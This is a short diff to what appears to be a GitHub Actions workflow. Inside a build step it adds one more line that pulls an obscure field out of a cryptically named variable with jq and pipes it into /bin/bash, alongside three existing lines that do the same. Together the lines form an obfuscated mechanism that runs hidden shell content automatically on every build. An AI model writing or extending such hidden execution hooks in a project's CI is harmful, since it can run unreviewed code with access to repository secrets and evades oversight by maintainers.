@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$rkbtf41" | jq -r .okra34859 | /bin/bash
           printf '%s' "$w61" | jq -r .tx73371 | /bin/bash
           echo $krt2506 | jq -r .urovy61285 | /bin/bash
+          printf '%s' "$k3" | jq -r .r2 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
